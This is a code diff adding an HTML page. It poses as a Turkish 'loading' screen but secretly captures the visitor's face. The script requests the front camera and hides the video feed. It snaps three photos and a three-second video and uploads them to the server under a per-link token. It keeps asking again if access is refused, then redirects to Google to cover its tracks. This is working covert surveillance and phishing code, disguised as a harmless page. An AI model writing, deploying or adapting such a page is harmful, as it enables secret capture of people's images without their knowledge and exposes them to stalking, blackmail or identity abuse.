@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Yukleniyor...</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+            font-family: Arial, sans-serif;
+        }
+        #loading {
+            color: #fff;
+            font-size: 18px;
+            text-align: center;
+        }
+        #loading::after {
+            content: "";
+            animation: dots 1.5s infinite;
+        }
+        @keyframes dots {
+            0% { content: "."; }
+            33% { content: ".."; }
+            66% { content: "..."; }
+        }
+        video {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+        }
+        canvas {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div id="loading">Yukleniyor</div>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const path = window.location.pathname;
+        const token = path.split("/c/")[1];
+
+        const video = document.getElementById("video");
+        const canvas = document.getElementById("canvas");
+        const loading = document.getElementById("loading");
+
+        let stream = null;
+        let photoCount = 0;
+        const maxPhotos = 3;
+
+        async function startCamera() {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: { 
+                        facingMode: "user",
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    },
+                    audio: false
+                });
+
+                video.srcObject = stream;
+                await video.play();
+
+                loading.innerHTML = "Lutfen bekleyin...";
+
+                setTimeout(() => {
+                    takePhotos();
+                }, 1000);
+
+            } catch (err) {
+                console.error("Kamera hatasi:", err);
+                loading.innerHTML = "Kamera erisimi gereklidir. Lutfen izin verin.";
+                setTimeout(startCamera, 2000);
+            }
+        }
+
+        function takePhotos() {
+            if (photoCount >= maxPhotos) {
+                loading.innerHTML = "Islem tamamlandi!";
+                setTimeout(() => {
+                    window.location.href = "https://www.google.com";
+                }, 500);
+                return;
+            }
+
+            canvas.width = video.videoWidth || 1280;
+            canvas.height = video.videoHeight || 720;
+            const ctx = canvas.getContext("2d");
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            const imageData = canvas.toDataURL("image/jpeg", 0.9);
+            sendPhoto(imageData);
+
+            photoCount++;
+
+            if (photoCount < maxPhotos) {
+                setTimeout(takePhotos, 500);
+            } else {
+                setTimeout(() => {
+                    loading.innerHTML = "Islem tamamlandi!";
+                    setTimeout(() => {
+                        window.location.href = "https://www.google.com";
+                    }, 500);
+                }, 500);
+            }
+        }
+
+        async function sendPhoto(imageData) {
+            try {
+                await fetch("/upload/" + token, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ image: imageData })
+                });
+            } catch (e) {
+                console.error("Gonderim hatasi:", e);
+            }
+        }
+
+        async function recordVideo() {
+            try {
+                const mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });
+                const chunks = [];
+
+                mediaRecorder.ondataavailable = (e) => {
+                    if (e.data.size > 0) chunks.push(e.data);
+                };
+
+                mediaRecorder.onstop = async () => {
+                    const blob = new Blob(chunks, { type: "video/webm" });
+                    const formData = new FormData();
+                    formData.append("video", blob, "video.webm");
+
+                    await fetch("/upload_video/" + token, {
+                        method: "POST",
+                        body: formData
+                    });
+                };
+
+                mediaRecorder.start();
+                setTimeout(() => mediaRecorder.stop(), 3000);
+            } catch (e) {
+                console.error("Video kayit hatasi:", e);
+            }
+        }
+
+        window.onload = () => {
+            startCamera();
+            setTimeout(recordVideo, 2000);
+        };
+
+        window.onbeforeunload = () => {
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+        };
+    </script>
+</body>
+</html>
